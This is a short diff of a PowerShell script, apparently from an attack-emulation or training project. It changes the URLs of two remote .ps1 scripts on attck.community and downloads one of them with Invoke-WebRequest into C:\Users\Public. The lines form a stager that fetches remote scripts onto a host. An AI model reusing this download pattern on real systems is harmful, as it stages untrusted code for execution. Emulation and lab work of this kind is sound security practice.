@@ -1,5 +1,5 @@
-$url="https://attck.community/AD/ad/WonTonPlatypus.ps1"
-$url2="https://attck.community/AD/ad/AppleDogPeas.ps1"
+$url="https://attck.community/attck/ad/ad/WonTonPlatypus.ps1"
+$url2="https://attck.community/attck/ad/ad/AppleDogPeas.ps1"
 $tempFilePath = "C:\Users\Public\WTP.ps1"
 $tempFilePath2 = "C:\Users\Public\ADP.ps1"
 Invoke-WebRequest $url -OutFile $tempFilePath
